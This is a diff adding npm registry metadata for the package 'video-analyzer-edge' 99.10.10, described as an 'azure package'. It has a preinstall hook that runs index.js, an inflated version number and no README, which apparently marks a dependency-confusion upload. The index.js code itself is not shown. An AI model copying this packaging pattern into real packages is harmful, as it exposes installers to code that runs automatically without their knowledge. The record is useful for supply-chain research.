@@ -1,0 +1,62 @@
+{
+    "_id": "video-analyzer-edge",
+    "name": "video-analyzer-edge",
+    "dist-tags": {
+        "latest": "99.10.10"
+    },
+    "versions": {
+        "99.10.10": {
+            "name": "video-analyzer-edge",
+            "version": "99.10.10",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "video-analyzer-edge@99.10.10",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-bC4IaEUK3ES6hj+LXVlHQi6dFK7aW6ZHwd23dVCTokAjch1qfwl6buTfdeBd+Z91aOLp1wPM6bfY7BqeGKh0eQ==",
+                "shasum": "bf71ef149b5114fba19f0447ff9b741baa92f337",
+                "tarball": "https://registry.npmjs.org/video-analyzer-edge/-/video-analyzer-edge-99.10.10.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5069,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiM6AvACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmo+LA//ZOEhcnm2VH+BXsnV5viWkPb22SDk3WnmfIetBxD52TzdwyH5\r\nGBRLkaQzSwdcMwePYWudlnHAQWz0eGo4HGRJVac6n8SeyLAodpA+vxU7RJcN\r\nBOADzvG11BPc4QRaKthuDdJ2SygFPN08MwmVeVeYfdaAvcVovltasdMBsIc8\r\nqCrwcTJPRr/CpjeWQxEXerWnR+GM73QJQq8IMyrvVVnlSZaTdRpr1VyK8Bj8\r\n22jRB3cB0yioH9G97NitR6zjjDTqf3zdoEt/RiivYu4rnztnaXXV50XWUjTA\r\nZwHxtCl5kJjvE7QdpYukuNoVeBtFTkr1Dz9QcC6FepYKHiT4TvXDBi7Vqx1U\r\nOEvG8gNi3Qyi0kYFrvvhUudQjLN4xVOKDUfggLuM9+mrTb5aN0aTSNEXVz/s\r\nCI++lz7dJ2tE3CMFvApcNMD4bdF5hfgUgO7W0kY7OvKyZkopWFxtzG0qFNAd\r\nHY4sR/ruHRJOdK8n2JyijnNDO3ggjTOjE+iy2bxpvC6K/nMTTOHOB16JWSZ1\r\n+3LY0zPBulOr00PnOF7qCMW6bCFupEkvj6H1mozR0AtSYF3a0MKCT9iFnUx/\r\nwSnm6n++uPMjQO1Yghttigise/1Z2hBHTvOyqIjJZOrS6Gkg6SrOCkJ4zTA7\r\nMe10Sa6GUJe1lhQlXUwJtTlKINF8ifkjlfA=\r\n=EKpu\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "video-analyzer",
+                "email": "video-analyzer@rt11.33mail.com"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "video-analyzer",
+                    "email": "video-analyzer@rt11.33mail.com"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/video-analyzer-edge_99.10.10_1647550511791_0.9982124918746682"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-17T20:55:11.790Z",
+        "99.10.10": "2022-03-17T20:55:11.923Z",
+        "modified": "2022-03-17T20:55:12.001Z"
+    },
+    "maintainers": [
+        {
+            "name": "video-analyzer",
+            "email": "video-analyzer@rt11.33mail.com"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
